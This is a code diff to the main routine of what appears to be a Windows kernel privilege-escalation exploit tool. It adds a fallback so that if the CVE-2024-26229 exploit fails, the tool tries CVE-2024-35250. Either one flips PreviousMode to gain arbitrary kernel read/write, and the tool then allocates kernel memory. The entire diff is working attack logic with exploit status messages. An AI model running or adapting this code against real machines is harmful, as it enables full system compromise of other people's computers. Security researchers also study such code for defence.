@@ -7,12 +7,22 @@
 #include <psapi.h>
 #include <ntstatus.h>
 
+#define __STREAMS__
+#define _INC_MMREG
+#include <strmif.h>
+#include <ks.h>
+#include <ksproxy.h>
+#include <ksmedia.h>
+
 #pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "Ksproxy.lib")
+#pragma comment(lib, "ksuser.lib")
 
 #include "ntdefs.h"
 #include "utils.h"
 #include "exploit.h"
 #include "kforge.h"
+
 
 int main()
 {
@@ -44,9 +54,16 @@ int main()
     printf("[+] Current EPROCESS: %p\n", (void*)CurrentEProcess);
 
     //
-    // Abuse CVE-2024-26229 exploit to switch PreviousMode for kernel permissions
+    // Abuse CVE-2024-26229 or CVE-2024-35250 exploit to switch PreviousMode for kernel permissions
     //
-    ObtainKernelExploit(CurrentKThread);
+    if (!ObtainKernelExploitCSC(CurrentKThread))
+    {
+        if (!ObtainKernelExploitKS(CurrentKThread))
+        {
+            printf("[+] Failed both exploit methods...\n");
+            return false;
+        }
+    }
 
     printf("[!] Obtained arbitrary kernel read/writes\n");
 
@@ -62,9 +79,6 @@ int main()
     {
         auto KernelAllocation = KF::ExAllocatePool(NonPagedPoolNx, 0x1000);
         printf("[!] Allocated kernel memory: %p\n", (void*)KernelAllocation);
-
-
-
         KF::Cleanup();
     }
 
